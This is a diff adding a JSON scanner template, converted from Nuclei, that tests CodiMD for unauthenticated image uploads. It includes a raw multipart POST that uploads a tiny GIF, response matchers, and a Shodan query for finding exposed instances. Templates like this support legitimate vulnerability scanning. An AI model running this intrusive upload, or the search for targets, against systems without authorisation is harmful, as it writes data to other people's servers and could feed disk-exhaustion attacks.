@@ -1,0 +1,152 @@
+{
+  "id": "codimd-unauth-file-upload",
+  "name": "CodiMD - File Upload",
+  "author": "denandz,PulseSecurity.co.nz",
+  "severity": "MEDIUM",
+  "description": "CodiMD does not require valid authentication to access uploaded images or to upload new image data. An attacker who can determine an uploaded image\u0027s URL can gain unauthorised access to uploaded image data, or can create a denial of service condition by exhausting all available disk space.\n",
+  "references": [
+    "https://github.com/hackmdio/codimd/security/advisories/GHSA-2764-jppc-p2hm",
+    "https://pulsesecurity.co.nz/advisories/codimd-missing-image-access-controls"
+  ],
+  "tags": [
+    "file-upload",
+    "intrusive",
+    "codimd"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "shodan": "html:\"CodiMD\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /uploadimage HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary\u003d---------------------------92633278134516118923780781161\n\n-----------------------------92633278134516118923780781161\nContent-Disposition: form-data; name\u003d\"image\"; filename\u003d\"{{randstr}}.gif\"\nContent-Type: image/gif\n\n{{base64_decode(\"R0lGODlhAQABAIABAP///wAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw\u003d\u003d\")}}\n-----------------------------92633278134516118923780781161--\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "REGEX",
+          "part": "body",
+          "values": [
+            "\"link\":\".*?.gif\""
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "internal": "true",
+          "group": 1
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "codimd-unauth-file-upload",
+    "info": {
+      "name": "CodiMD - File Upload",
+      "author": "denandz,PulseSecurity.co.nz",
+      "severity": "medium",
+      "description": "CodiMD does not require valid authentication to access uploaded images or to upload new image data. An attacker who can determine an uploaded image\u0027s URL can gain unauthorised access to uploaded image data, or can create a denial of service condition by exhausting all available disk space.\n",
+      "reference": [
+        "https://github.com/hackmdio/codimd/security/advisories/GHSA-2764-jppc-p2hm",
+        "https://pulsesecurity.co.nz/advisories/codimd-missing-image-access-controls"
+      ],
+      "metadata": {
+        "max_request": 1,
+        "shodan_query": "html:\"CodiMD\""
+      },
+      "tags": "file-upload,intrusive,codimd"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /uploadimage HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary\u003d---------------------------92633278134516118923780781161\n\n-----------------------------92633278134516118923780781161\nContent-Disposition: form-data; name\u003d\"image\"; filename\u003d\"{{randstr}}.gif\"\nContent-Type: image/gif\n\n{{base64_decode(\"R0lGODlhAQABAIABAP///wAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw\u003d\u003d\")}}\n-----------------------------92633278134516118923780781161--\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "\"link\":\".*?.gif\""
+            ],
+            "group": 1,
+            "internal": true
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ],
+        "extractors": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "\"link\":\"(.*)\""
+            ],
+            "group": 1,
+            "internal": true
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
